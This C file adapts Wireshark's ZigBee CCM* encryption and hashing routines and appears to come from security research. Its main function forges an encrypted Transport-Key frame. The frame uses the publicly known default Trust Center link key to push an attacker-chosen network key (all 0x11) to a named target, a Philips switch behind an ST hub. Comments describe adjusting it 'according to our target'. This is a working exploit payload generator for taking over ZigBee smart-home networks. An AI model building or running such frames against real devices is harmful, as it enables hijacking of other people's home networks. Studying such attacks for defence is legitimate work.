/*
 * zigbee_crypt.c
 * Copyright 2011 steiner <steiner@localhost.localdomain>
 * zigbee convenience functions
 * 
 * alot of this code was "borrowed" from wireshark
 * packet-zbee-security.c & pzcket-zbee-security.h
 * function: zbee_sec_ccm_decrypt
 */
 
// Explaination of Python Build Values http://docs.python.org/c-api/arg.html#Py_BuildValue

#include <stdio.h>
#include <gcrypt.h>
#include "zigbee_crypt.h"

typedef enum
{
    TRUE=1, FALSE=0
}gboolean;

typedef unsigned char gchar;
typedef unsigned int guint;
typedef unsigned char guint8;

void print_array(unsigned char* a, unsigned int len)
{
    int i = 0;
    for (i = 0; i < len; i++)
    {
        printf(" %02x", a[i]);
    }
    printf("\n");
}

/*FUNCTION:------------------------------------------------------
 *  NAME
 *      zbee_sec_hash
 *  DESCRIPTION
 *      ZigBee Cryptographic Hash Function, described in ZigBee
 *      specification sections B.1.3 and B.6.
 *
 *      This is a Matyas-Meyer-Oseas hash function using the AES-128
 *      cipher. We use the ECB mode of libgcrypt to get a raw block
 *      cipher.
 *
 *      Input may be any length, and the output must be exactly 1-block in length.
 *
 *      Implements the function:
 *          Hash(text) = Hash[t];
 *          Hash[0] = 0^(blocksize).
 *          Hash[i] = E(Hash[i-1], M[i]) XOR M[j];
 *          M[i] = i'th block of text, with some padding and flags concatenated.
 *  PARAMETERS
 *      guint8 *    input       - Hash Input (any length).
 *      guint8      input_len   - Hash Input Length.
 *      guint8 *    output      - Hash Output (exactly one block in length).
 *  RETURNS
 *      void
 *---------------------------------------------------------------
 */
static void zbee_sec_hash(char *input, uint input_len, char *output)
{
    char              cipher_in[ZBEE_SEC_CONST_BLOCKSIZE];
    uint               i, j;
    /* Cipher Instance. */
    gcry_cipher_hd_t    cipher_hd;
    
    /* Clear the first hash block (Hash0). */
    memset(output, 0, ZBEE_SEC_CONST_BLOCKSIZE);
    /* Create the cipher instance in ECB mode. */
    if (gcry_cipher_open(&cipher_hd, GCRY_CIPHER_AES128, GCRY_CIPHER_MODE_ECB, 0)) {
        return; /* Failed. */
    }
    /* Create the subsequent hash blocks using the formula: Hash[i] = E(Hash[i-1], M[i]) XOR M[i]
     *
     * because we can't garauntee that M will be exactly a multiple of the
     * block size, we will need to copy it into local buffers and pad it.
     *
     * Note that we check for the next cipher block at the end of the loop
     * rather than the start. This is so that if the input happens to end
     * on a block boundary, the next cipher block will be generated for the
     * start of the padding to be placed into.
     */
    i = 0;
    j = 0;
    while (i<input_len) {
        /* Copy data into the cipher input. */
        cipher_in[j++] = input[i++];
        /* Check if this cipher block is done. */
        if (j >= ZBEE_SEC_CONST_BLOCKSIZE) {
            /* We have reached the end of this block. Process it with the
             * cipher, note that the Key input to the cipher is actually
             * the previous hash block, which we are keeping in output.
             */
            (void)gcry_cipher_setkey(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE);
            (void)gcry_cipher_encrypt(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE);
            /* Now we have to XOR the input into the hash block. */
            for (j=0;j<ZBEE_SEC_CONST_BLOCKSIZE;j++) output[j] ^= cipher_in[j];
            /* Reset j to start again at the beginning at the next block. */
            j = 0;
        }
    } /* for */
    /* Need to append the bit '1', followed by '0' padding long enough to end
     * the hash input on a block boundary. However, because 'n' is 16, and 'l'
     * will be a multiple of 8, the padding will be >= 7-bits, and we can just
     * append the byte 0x80.
     */
    cipher_in[j++] = 0x80;
    /* Pad with '0' until the the current block is exactly 'n' bits from the
     * end.
     */
    while (j!=(ZBEE_SEC_CONST_BLOCKSIZE-2)) {
        if (j >= ZBEE_SEC_CONST_BLOCKSIZE) {
            /* We have reached the end of this block. Process it with the
             * cipher, note that the Key input to the cipher is actually
             * the previous hash block, which we are keeping in output.
             */
            (void)gcry_cipher_setkey(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE);
            (void)gcry_cipher_encrypt(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE);
            /* Now we have to XOR the input into the hash block. */
            for (j=0;j<ZBEE_SEC_CONST_BLOCKSIZE;j++) output[j] ^= cipher_in[j];
            /* Reset j to start again at the beginning at the next block. */
            j = 0;
        }
        /* Pad the input with 0. */
        cipher_in[j++] = 0x00;
    } /* while */
    /* Add the 'n'-bit representation of 'l' to the end of the block. */
    cipher_in[j++] = ((input_len * 8) >> 8) & 0xff;
    cipher_in[j] = ((input_len * 8) >> 0) & 0xff;
    /* Process the last cipher block. */
    (void)gcry_cipher_setkey(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE);
    (void)gcry_cipher_encrypt(cipher_hd, output, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE);
    /* XOR the last input block back into the cipher output to get the hash. */
    for (j=0;j<ZBEE_SEC_CONST_BLOCKSIZE;j++) output[j] ^= cipher_in[j];
    /* Cleanup the cipher. */
    gcry_cipher_close(cipher_hd);
    /* Done */
} /* zbee_sec_hash */

/*FUNCTION:------------------------------------------------------
 *  NAME
 *      zbee_sec_key_hash
 *  DESCRIPTION
 *      ZigBee Keyed Hash Function. Described in ZigBee specification
 *      section B.1.4, and in FIPS Publication 198. Strictly speaking
 *      there is nothing about the Keyed Hash Function which restricts
 *      it to only a single byte input, but that's all ZigBee ever uses.
 *
 *      This function implements the hash function:
 *          Hash(Key, text) = H((Key XOR opad) || H((Key XOR ipad) || text));
 *          ipad = 0x36 repeated.
 *          opad = 0x5c repeated.
 *          H() = ZigBee Cryptographic Hash (B.1.3 and B.6).
 *
 *      The output of this function is an ep_alloced buffer containing
 *      the key-hashed output, and is garaunteed never to return NULL.
 *  PARAMETERS
 *      guint8  *key    - ZigBee Security Key (must be ZBEE_SEC_CONST_KEYSIZE) in length.
 *      guint8  input   - ZigBee CCM* Nonce (must be ZBEE_SEC_CONST_NONCE_LEN) in length.
 *      packet_info *pinfo  - pointer to packet information fields
 *  RETURNS
 *      guint8*
 *---------------------------------------------------------------
 */
static char *zbee_sec_key_hash(char *key, char input, char *hash_out)
{
    char              hash_in[2*ZBEE_SEC_CONST_BLOCKSIZE];
    int                 i;
    static const char ipad = 0x36;
    static const char opad = 0x5c;
    
    /* Copy the key into hash_in and XOR with opad to form: (Key XOR opad) */
    for (i=0; i<ZBEE_SEC_CONST_KEYSIZE; i++) hash_in[i] = key[i] ^ opad;
    /* Copy the Key into hash_out and XOR with ipad to form: (Key XOR ipad) */
    for (i=0; i<ZBEE_SEC_CONST_KEYSIZE; i++) hash_out[i] = key[i] ^ ipad;
    /* Append the input byte to form: (Key XOR ipad) || text. */
    hash_out[ZBEE_SEC_CONST_BLOCKSIZE] = input;
    /* Hash the contents of hash_out and append the contents to hash_in to
     * form: (Key XOR opad) || H((Key XOR ipad) || text).
     */
    zbee_sec_hash(hash_out, ZBEE_SEC_CONST_BLOCKSIZE+1, hash_in+ZBEE_SEC_CONST_BLOCKSIZE);
    /* Hash the contents of hash_in to get the final result. */
    zbee_sec_hash(hash_in, 2*ZBEE_SEC_CONST_BLOCKSIZE, hash_out);
    return hash_out;
} /* zbee_sec_key_hash */

static gboolean
zbee_sec_ccm_decrypt(const gchar    *key,   /* Input */
                    const gchar     *nonce, /* Input */
                    const gchar     *a,     /* Input */
                    const gchar     *c,     /* Input */
                    gchar           *m,     /* Output */
                    guint           l_a,    /* sizeof(a) */
                    guint           l_m,    /* sizeof(m) */
                    guint           M)      /* sizeof(c) - sizeof(m) = sizeof(MIC) */
{
    guint8              cipher_in[ZBEE_SEC_CONST_BLOCKSIZE];
    guint8              cipher_out[ZBEE_SEC_CONST_BLOCKSIZE];
    guint8              decrypted_mic[ZBEE_SEC_CONST_BLOCKSIZE];
    guint               i, j;
    /* Cipher Instance. */
    gcry_cipher_hd_t    cipher_hd;

    /* Sanity-Check. */
    if (M > ZBEE_SEC_CONST_BLOCKSIZE) return FALSE;
    /*
     * The CCM* counter is L bytes in length, ensure that the payload
     * isn't long enough to overflow it.
     */
    if ((1 + (l_a/ZBEE_SEC_CONST_BLOCKSIZE)) > (1<<(ZBEE_SEC_CONST_L*8))) return FALSE;

    /******************************************************
     * Step 1: Encryption/Decryption Transformation
     ******************************************************
     */
    /* Create the CCM* counter block A0 */
    memset(cipher_in, 0, ZBEE_SEC_CONST_BLOCKSIZE);
    cipher_in[0] = ZBEE_SEC_CCM_FLAG_L;
    memcpy(cipher_in + 1, nonce, ZBEE_SEC_CONST_NONCE_LEN);
    /*
     * The encryption/decryption process of CCM* works in CTR mode. Open a CTR
     * mode cipher for this phase. NOTE: The 'counter' part of the CCM* counter
     * block is the last two bytes, and is big-endian.
     */
    if (gcry_cipher_open(&cipher_hd, GCRY_CIPHER_AES128, GCRY_CIPHER_MODE_CTR, 0)) {
        return FALSE;
    }
    /* Set the Key. */
    if (gcry_cipher_setkey(cipher_hd, key, ZBEE_SEC_CONST_KEYSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Set the counter. */
    if (gcry_cipher_setctr(cipher_hd, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /*
     * Copy the MIC into the stack buffer. We need to feed the cipher a full
     * block when decrypting the MIC (so that the payload starts on the second
     * block). However, the MIC may be less than a full block so use a fixed
     * size buffer to store the MIC, letting the CTR cipher overstep the MIC
     * if need be.
     */
    memset(decrypted_mic, 0, ZBEE_SEC_CONST_BLOCKSIZE);
    memcpy(decrypted_mic, c + l_m, M);
    /* Encrypt/Decrypt the MIC in-place. */
    if (gcry_cipher_encrypt(cipher_hd, decrypted_mic, ZBEE_SEC_CONST_BLOCKSIZE, decrypted_mic, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Encrypt/Decrypt the payload. */
    if (gcry_cipher_encrypt(cipher_hd, m, l_m, c, l_m)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Done with the CTR Cipher. */
    gcry_cipher_close(cipher_hd);

    /******************************************************
     * Step 3: Authentication Transformation
     ******************************************************
     */
    if (M == 0) {
        /* There is no authentication tag. We're done! */
        return TRUE;
    }
    /*
     * The authentication process in CCM* operates in CBC-MAC mode, but
     * unfortunately, the input to the CBC-MAC process needs some substantial
     * transformation and padding before we can feed it into the CBC-MAC
     * algorithm. Instead we will operate in ECB mode and perform the
     * transformation and padding on the fly.
     *
     * I also think that libgcrypt requires the input to be memory-aligned
     * when using CBC-MAC mode, in which case can't just feed it with data
     * from the packet buffer. All things considered it's just a lot easier
     * to use ECB mode and do CBC-MAC manually.
     */
    /* Re-open the cipher in ECB mode. */
    if (gcry_cipher_open(&cipher_hd, GCRY_CIPHER_AES128, GCRY_CIPHER_MODE_ECB, 0)) {
        return FALSE;
    }
    /* Re-load the key. */
    if (gcry_cipher_setkey(cipher_hd, key, ZBEE_SEC_CONST_KEYSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Generate the first cipher block B0. */
    cipher_in[0] = ZBEE_SEC_CCM_FLAG_M(M) |
                    ZBEE_SEC_CCM_FLAG_ADATA(l_a) |
                    ZBEE_SEC_CCM_FLAG_L;
    memcpy(cipher_in+sizeof(gchar), nonce, ZBEE_SEC_CONST_NONCE_LEN);
    for (i=0;i<ZBEE_SEC_CONST_L; i++) {
        cipher_in[(ZBEE_SEC_CONST_BLOCKSIZE-1)-i] = (l_m >> (8*i)) & 0xff;
    } /* for */
    /* Generate the first cipher block, X1 = E(Key, 0^128 XOR B0). */
    if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /*
     * We avoid mallocing() big chunks of memory by recycling small stack
     * buffers for the encryption process. Throughout this process, j is always
     * pointed to the position within the current buffer.
     */
    j = 0;
    /* AuthData = L(a) || a || Padding || m || Padding
     * Where L(a) =
     *      - an empty string if l(a) == 0.
     *      - 2-octet encoding of l(a) if 0 < l(a) < (2^16 - 2^8)
     *      - 0xff || 0xfe || 4-octet encoding of l(a) if (2^16 - 2^8) <= l(a) < 2^32
     *      - 0xff || 0xff || 8-octet encoding of l(a)
     * But for ZigBee, the largest packet size we should ever see is 2^7, so we
     * are only really concerned with the first two cases.
     *
     * To generate the MIC tag CCM* operates similar to CBC-MAC mode. Each block
     * of AuthData is XOR'd with the last block of cipher output to produce the
     * next block of cipher output. Padding sections have the minimum non-negative
     * length such that the padding ends on a block boundary. Padded bytes are 0.
     */
    if (l_a > 0) {
        /* Process L(a) into the cipher block. */
        cipher_in[j] = cipher_out[j] ^ ((l_a >> 8) & 0xff);
        j++;
        cipher_in[j] = cipher_out[j] ^ ((l_a >> 0) & 0xff);
        j++;
        /* Process a into the cipher block. */
        for (i=0;i<l_a;i++,j++) {
            if (j>=ZBEE_SEC_CONST_BLOCKSIZE) {
                /* Generate the next cipher block. */
                if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in,
                            ZBEE_SEC_CONST_BLOCKSIZE)) {
                    gcry_cipher_close(cipher_hd);
                    return FALSE;
                }
                /* Reset j to point back to the start of the new cipher block. */
                j = 0;
            }
            /* Cipher in = cipher_out ^ a */
            cipher_in[j] = cipher_out[j] ^ a[i];
        } /* for */
        /* Process padding into the cipher block. */
        for (;j<ZBEE_SEC_CONST_BLOCKSIZE;j++)
            cipher_in[j] = cipher_out[j];
    }
    /* Process m into the cipher block. */
    for (i=0; i<l_m; i++, j++) {
        if (j>=ZBEE_SEC_CONST_BLOCKSIZE) {
            /* Generate the next cipher block. */
            if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in,
                       ZBEE_SEC_CONST_BLOCKSIZE)) {
                gcry_cipher_close(cipher_hd);
                return FALSE;
            }
            /* Reset j to point back to the start of the new cipher block. */
            j = 0;
        }
        /* Cipher in = cipher out ^ m */
        cipher_in[j] = cipher_out[j] ^ m[i];
    } /* for */
    /* Padding. */
    for (;j<ZBEE_SEC_CONST_BLOCKSIZE;j++)
        cipher_in[j] = cipher_out[j];
    /* Generate the last cipher block, which will be the MIC tag. */
    if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Done with the Cipher. */
    gcry_cipher_close(cipher_hd);

    /* Compare the MIC's */
    return (memcmp(cipher_out, decrypted_mic, M) == 0);
} /* zbee_ccm_decrypt */


static gboolean
zbee_sec_ccm_get_mic(const gchar    *key,   /* Input */
                    const gchar     *nonce, /* Input */
                    const gchar     *a,     /* Input */
                    const gchar     *m,     /* Input */
                    gchar     *encrypted_payload, /* Output. This is the encrypted payload */
                    gchar           *c,     /* Output. This is computed encrypted MIC */
                    guint           l_a,    /* sizeof(a) */
                    guint           l_m,    /* sizeof(m) */
                    guint           M)      /* sizeof(MIC) */
{
    guint8              cipher_in[ZBEE_SEC_CONST_BLOCKSIZE];
    guint8              cipher_out[ZBEE_SEC_CONST_BLOCKSIZE];
    guint8              decrypted_mic[ZBEE_SEC_CONST_BLOCKSIZE];
    guint               i, j;
    /* Cipher Instance. */
    gcry_cipher_hd_t    cipher_hd;

    /* Sanity-Check. */
    if (M > ZBEE_SEC_CONST_BLOCKSIZE) return FALSE;
    /*
     * The CCM* counter is L bytes in length, ensure that the payload
     * isn't long enough to overflow it.
     */
    if ((1 + (l_a/ZBEE_SEC_CONST_BLOCKSIZE)) > (1<<(ZBEE_SEC_CONST_L*8))) return FALSE;

    memset(cipher_in, 0, sizeof(cipher_in));
    memset(cipher_out, 0, sizeof(cipher_out));
    memset(decrypted_mic, 0, sizeof(decrypted_mic));

    /******************************************************
     * Step 3: Authentication Transformation to compute MIC
     ******************************************************
     */
    if (M == 0) {
        /* There is no authentication tag. We're done! */
        return TRUE;
    }
    /*
     * The authentication process in CCM* operates in CBC-MAC mode, but
     * unfortunately, the input to the CBC-MAC process needs some substantial
     * transformation and padding before we can feed it into the CBC-MAC
     * algorithm. Instead we will operate in ECB mode and perform the
     * transformation and padding on the fly.
     *
     * I also think that libgcrypt requires the input to be memory-aligned
     * when using CBC-MAC mode, in which case can't just feed it with data
     * from the packet buffer. All things considered it's just a lot easier
     * to use ECB mode and do CBC-MAC manually.
     */
    /* Re-open the cipher in ECB mode. */
    if (gcry_cipher_open(&cipher_hd, GCRY_CIPHER_AES128, GCRY_CIPHER_MODE_ECB, 0)) {
        return FALSE;
    }
    /* Re-load the key. */
    if (gcry_cipher_setkey(cipher_hd, key, ZBEE_SEC_CONST_KEYSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Generate the first cipher block B0. */
    cipher_in[0] = ZBEE_SEC_CCM_FLAG_M(M) |
                    ZBEE_SEC_CCM_FLAG_ADATA(l_a) |
                    ZBEE_SEC_CCM_FLAG_L;
    memcpy(cipher_in+sizeof(gchar), nonce, ZBEE_SEC_CONST_NONCE_LEN);
    for (i=0;i<ZBEE_SEC_CONST_L; i++) {
        cipher_in[(ZBEE_SEC_CONST_BLOCKSIZE-1)-i] = (l_m >> (8*i)) & 0xff;
    } /* for */
    /* Generate the first cipher block, X1 = E(Key, 0^128 XOR B0). */
    if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /*
     * We avoid mallocing() big chunks of memory by recycling small stack
     * buffers for the encryption process. Throughout this process, j is always
     * pointed to the position within the current buffer.
     */
    j = 0;
    /* AuthData = L(a) || a || Padding || c || Padding
     * Where L(a) =
     *      - an empty string if l(a) == 0.
     *      - 2-octet encoding of l(a) if 0 < l(a) < (2^16 - 2^8)
     *      - 0xff || 0xfe || 4-octet encoding of l(a) if (2^16 - 2^8) <= l(a) < 2^32
     *      - 0xff || 0xff || 8-octet encoding of l(a)
     * But for ZigBee, the largest packet size we should ever see is 2^7, so we
     * are only really concerned with the first two cases.
     *
     * To generate the MIC tag CCM* operates similar to CBC-MAC mode. Each block
     * of AuthData is XOR'd with the last block of cipher output to produce the
     * next block of cipher output. Padding sections have the minimum non-negative
     * length such that the padding ends on a block boundary. Padded bytes are 0.
     */

    /* Modification by JC
    * Since this function needs to get MIC, here we need to replace m with the original data m
    */
    if (l_a > 0) {
        /* Process L(a) into the cipher block. */
        cipher_in[j] = cipher_out[j] ^ ((l_a >> 8) & 0xff);
        j++;
        cipher_in[j] = cipher_out[j] ^ ((l_a >> 0) & 0xff);
        j++;
        /* Process a into the cipher block. */
        for (i=0;i<l_a;i++,j++) {
            if (j>=ZBEE_SEC_CONST_BLOCKSIZE) {
                /* Generate the next cipher block. */
                if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in,
                            ZBEE_SEC_CONST_BLOCKSIZE)) {
                    gcry_cipher_close(cipher_hd);
                    return FALSE;
                }
                /* Reset j to point back to the start of the new cipher block. */
                j = 0;
            }
            /* Cipher in = cipher_out ^ a */
            cipher_in[j] = cipher_out[j] ^ a[i];
        } /* for */
        /* Process padding into the cipher block. */
        for (;j<ZBEE_SEC_CONST_BLOCKSIZE;j++)
            cipher_in[j] = cipher_out[j];
    }
    /* Process m into the cipher block. */
    for (i=0; i<l_m; i++, j++) {
        if (j>=ZBEE_SEC_CONST_BLOCKSIZE) {
            /* Generate the next cipher block. */
            if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in,
                       ZBEE_SEC_CONST_BLOCKSIZE)) {
                gcry_cipher_close(cipher_hd);
                return FALSE;
            }
            /* Reset j to point back to the start of the new cipher block. */
            j = 0;
        }
        /* Cipher in = cipher out ^ c */
        cipher_in[j] = cipher_out[j] ^ m[i];
    } /* for */
    /* Padding. */
    for (;j<ZBEE_SEC_CONST_BLOCKSIZE;j++)
        cipher_in[j] = cipher_out[j];
    /* Generate the last cipher block, which will be the MIC tag. */
    if (gcry_cipher_encrypt(cipher_hd, cipher_out, ZBEE_SEC_CONST_BLOCKSIZE, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Done with the Cipher. */
    gcry_cipher_close(cipher_hd);
    // First get unencrypted MIC
    memcpy(c, cipher_out, M);

    /******************************************************
     * Step 1: Encryption/Decryption Transformation
     ******************************************************
     */
    /* Create the CCM* counter block A0 */
    memset(cipher_in, 0, ZBEE_SEC_CONST_BLOCKSIZE);
    cipher_in[0] = ZBEE_SEC_CCM_FLAG_L;
    memcpy(cipher_in + 1, nonce, ZBEE_SEC_CONST_NONCE_LEN);
    /*
     * The encryption/decryption process of CCM* works in CTR mode. Open a CTR
     * mode cipher for this phase. NOTE: The 'counter' part of the CCM* counter
     * block is the last two bytes, and is big-endian.
     */
    if (gcry_cipher_open(&cipher_hd, GCRY_CIPHER_AES128, GCRY_CIPHER_MODE_CTR, 0)) {
        return FALSE;
    }
    /* Set the Key. */
    if (gcry_cipher_setkey(cipher_hd, key, ZBEE_SEC_CONST_KEYSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Set the counter. */
    if (gcry_cipher_setctr(cipher_hd, cipher_in, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }

    
    /* Encrypt/Decrypt the MIC in-place. */
    if (gcry_cipher_encrypt(cipher_hd, c, ZBEE_SEC_CONST_BLOCKSIZE, c, ZBEE_SEC_CONST_BLOCKSIZE)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Encrypt/Decrypt the payload. */
    if (gcry_cipher_encrypt(cipher_hd, encrypted_payload, l_m, m, l_m)) {
        gcry_cipher_close(cipher_hd);
        return FALSE;
    }
    /* Done with the CTR Cipher. */
    gcry_cipher_close(cipher_hd);

    return TRUE;
}


int main(int argc, char *argv[]) {
    // Default Trust Center Link Key
    unsigned char key[ZBEE_SEC_CONST_KEYSIZE];
    // Key-transport key
    unsigned char key_transport_key[ZBEE_SEC_CONST_KEYSIZE+1];
    
    char input = 0x00;
    int count;
    memset(key, 0, sizeof(key));
    memset(key_transport_key, 0, sizeof(key_transport_key));

    count = 0;
    key[count++] = 0x5A; key[count++] = 0x69; key[count++] = 0x67; key[count++] = 0x42; key[count++] = 0x65; key[count++] = 0x65; key[count++] = 0x41; key[count++] = 0x6c;
    key[count++] = 0x6C; key[count++] = 0x69; key[count++] = 0x61; key[count++] = 0x6E; key[count++] = 0x63; key[count++] = 0x65; key[count++] = 0x30; key[count++] = 0x39;
    // get key-transport key
    zbee_sec_key_hash(key, input, key_transport_key);
    // get nonce. Here we give a relatively large frame counter: 0xaa 0xaa 0xaa 0xaa
    unsigned char nonce[13] = {0x14, 0x4a, 0x05, 0x02, 0x00, 0x97, 0x6d, 0x28, 0xaa, 0xaa, 0xaa, 0xaa, 0x35};
    // get a = ApsHeader || AuxHeader. Here we give a relatively large counter: 0xff
    unsigned char a[] =  {0x21, 0xff, 0x35, 0xaa, 0xaa, 0xaa, 0xaa, 0x14, 0x4a, 0x05, 0x02, 0x00, 0x97, 0x6d, 0x28};
    // get unencrypted_payload: This is what we want to finally control. Here we change NWK key to 111111....11. Also we change sequence number to 0xff.
    // 2nd line: Key Sequence  (WE MAY NEED TO ADJUST ACCORDING TO OUR TARGET)
    // 3rd line: dest addr: (WE MAY NEED TO ADJUST ACCORDING TO OUR TARGET). Here we first use Philips Switch
    // 4th line: src  addr, which is ST hub
    unsigned char unencrypted_payload[] = {0x05, \
                                           0x01, \
                                           0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, \
                                           0xff,\
                                           0xcc, 0x7a, 0xf4, 0x08, 0x01, 0x88, 0x17, 0x00, \
                                           0x14, 0x4a, 0x05, 0x02, 0x00, 0x97, 0x6d, 0x28}; 
    // l_a
    guint l_a = sizeof(a);
    // l_m
    guint l_m = sizeof(unencrypted_payload);
    // M
    guint M = 4;

    // Output 1: encrypted_payload
    unsigned char encrypted_payload[300];
    memset(encrypted_payload, 0, sizeof(encrypted_payload));
    // Output 2: computed_MIC
    unsigned char computed_MIC[ZBEE_SEC_CONST_BLOCKSIZE];
    memset(computed_MIC, 0, sizeof(computed_MIC));


    zbee_sec_ccm_get_mic(key_transport_key,
    nonce,
    a,
    unencrypted_payload,
    encrypted_payload,
    computed_MIC,
    l_a,
    l_m,
    M
    );
    printf("Encrypted Payload: ");
    print_array(encrypted_payload, l_m);
    printf("MIC: ");
    print_array(computed_MIC, M);
	return 0;
}
